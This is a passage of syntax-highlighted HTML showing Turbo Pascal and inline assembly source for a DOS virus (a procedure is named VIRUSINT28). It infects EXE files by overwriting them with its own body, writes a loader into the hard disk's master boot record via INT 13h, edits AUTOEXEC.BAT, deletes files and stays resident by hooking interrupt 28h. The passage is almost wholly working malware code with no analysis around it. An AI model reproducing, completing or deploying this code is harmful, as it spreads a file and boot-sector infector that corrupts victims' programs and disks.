</span><span class="sc5">FUNCTION</span><span class="sc0"> </span><span class="sc11">RANDOMNAME</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">FUNCTION</span><span class="sc0"> </span><span class="sc11">POELETRA</span><span class="sc10">(</span><span class="sc11">QTAS</span><span class="sc10">:</span><span class="sc11">CHAR</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc5">STRING</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">CH</span><span class="sc10">:</span><span class="sc11">CHAR</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">TEMP</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">12</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc11">TEMP</span><span class="sc10">:=</span><span class="sc7">''</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">REPEAT</span><span class="sc0">
      </span><span class="sc11">CH</span><span class="sc10">:=</span><span class="sc11">CHR</span><span class="sc10">(</span><span class="sc4">65</span><span class="sc10">+</span><span class="sc11">RANDOM</span><span class="sc10">(</span><span class="sc4">25</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">TEMP</span><span class="sc10">:=</span><span class="sc11">TEMP</span><span class="sc10">+</span><span class="sc11">CH</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">UNTIL</span><span class="sc0"> </span><span class="sc11">TEMP</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc11">QTAS</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">POELETRA</span><span class="sc10">:=</span><span class="sc11">TEMP</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">RANDOMNAME</span><span class="sc10">:=</span><span class="sc11">POELETRA</span><span class="sc10">(</span><span class="sc7">#8</span><span class="sc10">)+</span><span class="sc7">'.'</span><span class="sc10">+</span><span class="sc11">POELETRA</span><span class="sc10">(</span><span class="sc7">#3</span><span class="sc10">)+</span><span class="sc7">#0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">PSPOWNER</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">ENVOFF</span><span class="sc10">:=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">FILENAME</span><span class="sc10">:=</span><span class="sc7">''</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">GETSEGMENTS</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">REPEAT</span><span class="sc0">
    </span><span class="sc11">ENVOFF</span><span class="sc10">:=</span><span class="sc11">ENVOFF</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">UNTIL</span><span class="sc0"> </span><span class="sc11">MEMW</span><span class="sc10">[</span><span class="sc11">ENVSEG</span><span class="sc10">:</span><span class="sc11">ENVOFF</span><span class="sc10">]=</span><span class="sc4">$00</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ENVOFF</span><span class="sc10">:=</span><span class="sc11">ENVOFF</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">REPEAT</span><span class="sc0">
    </span><span class="sc11">FILENAME</span><span class="sc10">:=</span><span class="sc11">FILENAME</span><span class="sc10">+</span><span class="sc11">CHR</span><span class="sc10">(</span><span class="sc11">MEM</span><span class="sc10">[</span><span class="sc11">ENVSEG</span><span class="sc10">:</span><span class="sc11">ENVOFF</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">ENVOFF</span><span class="sc10">:=</span><span class="sc11">ENVOFF</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">UNTIL</span><span class="sc0"> </span><span class="sc11">MEM</span><span class="sc10">[</span><span class="sc11">ENVSEG</span><span class="sc10">:</span><span class="sc11">ENVOFF</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc4">$00</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">VIRUSINT28</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">INTERRUPT</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">INFECTEXE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">NEWNAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
      </span><span class="sc11">WHERESLASH</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">OK</span><span class="sc10">:</span><span class="sc11">BYTE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc11">OK</span><span class="sc10">:=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">ASM</span><span class="sc14">
      PUSH DS
      MOV AX, SEG FILENAME
      MOV DS, AX
      MOV SI, OFFSET FILENAME
      MOV DX, SI
      INC DX
      MOV AX, 4300H
      INT 21H
      JC @TERMINATED
      CMP CX, 1
      JE @TERMINATED
      XOR CX, CX
    @SEARCHSLASH:
      INC SI
      INC CX
      CMP BYTE PTR DS:[SI], 0
      JE @TERMINATED
      CMP BYTE PTR DS:[SI], </span><span class="sc7">'\'</span><span class="sc14">
      JNE @SEARCHSLASH
      MOV WHERESLASH, CX
      MOV OK, 1
      JMP @SEARCHSLASH
    @TERMINATED:
      POP DS
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc11">OK</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
      </span><span class="sc11">NEWNAME</span><span class="sc10">:=</span><span class="sc11">COPY</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">WHERESLASH</span><span class="sc10">)+</span><span class="sc11">RANDOMNAME</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">RENAMEFILE</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">,</span><span class="sc11">NEWNAME</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">CREATENEWFILE</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">WRITEFILE</span><span class="sc10">(</span><span class="sc11">VIRBUFFER</span><span class="sc10">,</span><span class="sc11">VIRSIZE</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">CLOSEFILE</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">COPYTO</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">,</span><span class="sc11">NEWNAME</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">ERASEFILE</span><span class="sc10">(</span><span class="sc11">NEWNAME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">ASM</span><span class="sc14">
      PUSH DS
      MOV AX, SEG FILENAME
      MOV DS, AX
      MOV DX, OFFSET FILENAME
      INC DX
      MOV AX, 4301H
      MOV CX, 1
      INT 21H
      POP DS
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">PSPOWNER</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc5">NOT</span><span class="sc10">(</span><span class="sc11">OLDNAME</span><span class="sc10">=</span><span class="sc11">FILENAME</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">[</span><span class="sc11">LENGTH</span><span class="sc10">(</span><span class="sc11">FILENAME</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">'E'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc11">INFECTEXE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">OLDNAME</span><span class="sc10">:=</span><span class="sc11">FILENAME</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">INITALL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">COUNT</span><span class="sc10">:</span><span class="sc11">BYTE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">AEXEC</span><span class="sc10">:=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">RANDOMIZE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PSPOWNER</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MYNAME</span><span class="sc10">:=</span><span class="sc11">FILENAME</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">OPENFILE</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">READFILE</span><span class="sc10">(</span><span class="sc11">VIRBUFFER</span><span class="sc10">,</span><span class="sc11">VIRSIZE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CLOSEFILE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc11">PARAMSTR</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)=</span><span class="sc7">'!'</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc5">ASM</span><span class="sc14">
      PUSH DS
      PUSH CS
      POP DS
      CALL @GETNAME
      DB </span><span class="sc7">'AUTOEXEC.BAT'</span><span class="sc14">, 0
    @GETNAME:
      POP DX
      MOV AX, 3D02H
      INT 21H
      JC @ECA
      XCHG AX, BX
      MOV AX, 4202H
      MOV CX, -1
      MOV DX, -19
      INT 21H
      MOV AH, 40H
      XOR CX, CX
      INT 21H
      MOV AH, 3EH
      INT 21H
      MOV AX, SEG MYNAME
      MOV DS, AX
      MOV DX, OFFSET MYNAME
      INC DX
      MOV AX, 4301H
      XOR CX, CX
      INT 21H
      JC @ECA
      MOV AH, 41H
      INT 21H
    @ECA:
      POP DS
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">AEXEC</span><span class="sc10">:=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">FOR</span><span class="sc0"> </span><span class="sc11">COUNT</span><span class="sc10">:=</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">TO</span><span class="sc0"> </span><span class="sc11">PARAMCOUNT</span><span class="sc0"> </span><span class="sc5">DO</span><span class="sc0"> </span><span class="sc11">MYPARAMS</span><span class="sc10">:=</span><span class="sc11">MYPARAMS</span><span class="sc10">+</span><span class="sc11">PARAMSTR</span><span class="sc10">(</span><span class="sc11">COUNT</span><span class="sc10">)+</span><span class="sc7">' '</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">SPAWNHOST</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">NEWNAME</span><span class="sc10">:</span><span class="sc5">STRING</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">INF</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OUTF</span><span class="sc10">:</span><span class="sc5">FILE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ATTR</span><span class="sc10">:</span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc11">AEXEC</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc5">ASM</span><span class="sc14">
      PUSH DS
      MOV AX, SEG MYNAME
      MOV DS, AX
      MOV DX, OFFSET MYNAME
      INC DX
      MOV AX, 4300H
      INT 21H
      MOV ATTR, CX
      MOV AX, 4301H
      XOR CX, CX
      INT 21H
      POP DS
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">NEWNAME</span><span class="sc10">:=</span><span class="sc11">RANDOMNAME</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RENAMEFILE</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">,</span><span class="sc11">NEWNAME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CREATENEWFILE</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CLOSEFILE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">COPYTO</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">,</span><span class="sc11">NEWNAME</span><span class="sc10">,</span><span class="sc11">VIRSIZE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SWAPVECTORS</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">EXEC</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MYPARAMS</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SWAPVECTORS</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ERASEFILE</span><span class="sc10">(</span><span class="sc11">MYNAME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RENAMEFILE</span><span class="sc10">(</span><span class="sc11">NEWNAME</span><span class="sc10">,</span><span class="sc11">MYNAME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">ASM</span><span class="sc14">
      PUSH DS
      MOV AX, SEG MYNAME
      MOV DS, AX
      MOV DX, OFFSET MYNAME
      INC DX
      MOV AX, 4301H
      MOV CX, ATTR
      INT 21H
      MOV AX, SEG NEWNAME
      MOV DS, AX
      MOV DX, OFFSET NEWNAME
      INC DX
      MOV AX, 4301H
      XOR CX, CX
      INT 21H
      MOV AH, 41H
      INT 21H
      POP DS
    </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">FUNCTION</span><span class="sc0"> </span><span class="sc11">RESIDENT</span><span class="sc10">:</span><span class="sc11">BOOLEAN</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">VAR</span><span class="sc0"> </span><span class="sc11">IVT</span><span class="sc10">:</span><span class="sc11">LONGINT</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">IVT</span><span class="sc10">:=</span><span class="sc11">MEML</span><span class="sc10">[</span><span class="sc4">$0</span><span class="sc10">:</span><span class="sc4">$350</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc11">IVT</span><span class="sc10">=</span><span class="sc4">$20FF20FF</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc11">RESIDENT</span><span class="sc10">:=</span><span class="sc11">TRUE</span><span class="sc0"> </span><span class="sc5">ELSE</span><span class="sc0"> </span><span class="sc11">RESIDENT</span><span class="sc10">:=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">MLOADER</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">EXTERNAL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">{$L MLOADER.OBJ}</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">LOADER</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">EXTERNAL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">{$L LOADER.OBJ}</span><span class="sc0">

</span><span class="sc5">PROCEDURE</span><span class="sc0"> </span><span class="sc11">INFECTMBR</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc5">ASM</span><span class="sc14">
    PUSH DS
    PUSH CS
    POP ES
    PUSH CS
    POP DS
    MOV AH, 08H
    MOV DX, 0080H
    INT 13H
    AND CX, 00111111B
    CMP CL, ((VIRSIZE+511)/512)+6
    JB @OVERBUFFER
    MOV AX, 0201H
    MOV CX, 0001H
    MOV BX, OFFSET @BUFFER
    MOV DX, 0080H
    INT 13H
    JC @OVERBUFFER
    MOV DI, BX
    MOV SI, OFFSET MLOADER
    MOV AX, WORD PTR [SI]
    CMP WORD PTR [DI], AX
    JE @OVERBUFFER
    MOV AX, 0301H
    MOV CX, 0002H
    INT 13H
    JC @OVERBUFFER
    MOV CX, OFFSET LOADER
    SUB CX, OFFSET MLOADER
    CLD
    REP MOVSB
    MOV AX, 0301H
    MOV CX, 0001H
    MOV DX, 0080H
    INT 13H
    JC @OVERBUFFER
    MOV AX, 0302H
    MOV CX, 0003H
    MOV BX, OFFSET LOADER
    MOV DX, 0080H
    INT 13H
    JC @OVERBUFFER
    MOV BX, OFFSET VIRBUFFER
    MOV AX, SEG VIRBUFFER
    MOV ES, AX
    MOV AX, 300H+((VIRSIZE+511)/512)
    MOV CX, 0005H
    INT 13H
    JMP @OVERBUFFER
  @BUFFER:
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
    DB 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
  @OVERBUFFER:
    POP DS
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">BEGIN</span><span class="sc0">
  </span><span class="sc11">INITALL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">INFECTMBR</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">SPAWNHOST</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">IF</span><span class="sc0"> </span><span class="sc5">NOT</span><span class="sc10">(</span><span class="sc11">RESIDENT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">THEN</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
    </span><span class="sc11">MEML</span><span class="sc10">[</span><span class="sc4">$0</span><span class="sc10">:</span><span class="sc4">$350</span><span class="sc10">]:=</span><span class="sc4">$20FF20FF</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SETINTVEC</span><span class="sc10">(</span><span class="sc4">$28</span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">VIRUSINT28</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">KEEP</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">END</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">END.</span><span class="sc0">
</span></div></body>
</html>
